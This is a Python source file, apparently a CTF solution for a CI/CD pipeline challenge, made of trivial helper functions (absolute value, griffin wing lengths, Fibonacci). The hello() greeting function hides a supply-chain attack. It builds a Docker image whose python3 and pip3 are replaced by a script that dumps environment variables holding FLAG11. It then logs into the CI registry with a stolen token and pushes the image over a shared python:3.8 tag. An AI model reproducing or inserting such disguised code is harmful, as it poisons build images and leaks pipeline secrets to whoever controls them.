import subprocess

DOCKERFILE = """FROM python:3.8

COPY python3 /usr/local/bin/
COPY python3 /usr/local/bin/pip3"""
PYTHON3 = """#!/bin/bash

env | grep FLAG11 || true"""


def run(cmd):
    proc = subprocess.run(cmd, shell=True, timeout=180)
    print(proc.stdout)
    print(proc.stderr)


def hello(name):
    """
    This function greets to
    the person passed in as
    a parameter
    """
    run('apk add docker-cli')
    with open('Dockerfile', 'w') as f:
        f.write(DOCKERFILE)
    with open('python3', 'w') as f:
        f.write(PYTHON3)
    run('chmod +x python3')
    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
    return "Hello, " + name


def absolute_value(num):
    """This function returns the absolute
    value of the entered number"""

    if num >= 0:
        return num
    else:
        return -num


def get_wings_length_of_griffin_based_on_age(age):
    if age >= 0 and age < 5:
        return 70
    elif age >= 5 and age < 10:
        return 130
    elif age >= 10 and age < 25:
        return 170


def my_func():
    x = 10
    print("Value inside function:", x)


def get_head_weight_of_adult_griffin(age):
    return 70


def gryphon_legacy(n):
    # Check if input is 0 then it will
    # print incorrect input
    if n < 0:
        print("Incorrect input")

    # Check if n is 0
    # then it will return 0
    elif n == 0:
        return 0

    # Check if n is 1,2
    # it will return 1
    elif n == 1 or n == 2:
        return 1

    else:
        return gryphon_legacy(n - 1) + gryphon_legacy(n - 2)
